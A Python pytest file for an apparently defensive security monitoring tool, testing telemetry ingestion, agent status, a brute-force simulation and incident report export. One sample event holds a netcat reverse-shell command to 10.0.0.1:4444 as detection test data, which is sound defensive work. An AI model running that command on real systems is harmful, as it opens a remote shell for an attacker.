import pytest
import os
import sys
import datetime

# Ensure project root is in python path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from web.server import ingest_live_telemetry, export_incident_report, get_agent_status, IngestBatchRequest, trigger_simulation, SimulationRequest
from generator.models import ScenarioType
from agent.collector import EndpointCollectorAgent

def test_live_ingest_api_and_report_export():
    # 1. Test Ingestion API endpoint function directly
    payload = IngestBatchRequest(
        agent_id="test-agent-01",
        hostname="prod-host-alpha",
        events=[
            {
                "id": "evt-ingest-101",
                "timestamp": "2026-08-17T21:40:00.000Z",
                "log_type": "auditd.log",
                "user": "root",
                "process_name": "nc",
                "command_line": "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
                "raw_message": 'type=SYSCALL msg=audit(1786982000.100:1001): syscall=59 uid=33(www-data) exe="/usr/bin/nc.traditional" key="exec"',
                "details": {
                    "process_name": "nc",
                    "user": "www-data"
                }
            }
        ]
    )

    data = ingest_live_telemetry(payload)
    assert data["status"] == "success"
    assert data["ingested_count"] == 1

    # 2. Test Agent Status endpoint
    status_data = get_agent_status()
    assert status_data["active_agents_count"] >= 1
    assert status_data["total_ingested_events"] >= 1

    # 3. Trigger simulation to generate alert for report export test
    sim_req = SimulationRequest(scenario=ScenarioType.BRUTE_FORCE, num_failures=10)
    trigger_res = trigger_simulation(sim_req)
    assert trigger_res["status"] == "success"

    # 4. Test Incident Report Export endpoint function
    from engine.detection_engine import DetectionEngine
    from web.server import detection_engine
    alerts = detection_engine.alert_manager.get_all_alerts(10)
    assert len(alerts) > 0
    target_alert_id = alerts[0].alert_id

    report = export_incident_report(target_alert_id)
    assert report["report_id"] == f"REP-{target_alert_id}"
    assert "incident_overview" in report
    assert "forensic_evidence" in report
    assert "siem_conversions" in report

def test_collector_agent_instantiation():
    agent = EndpointCollectorAgent(server_url="http://127.0.0.1:8000", agent_id="unit-test-agent")
    assert agent.agent_id == "unit-test-agent"
    events = agent.collect_system_processes()
    assert isinstance(events, list)
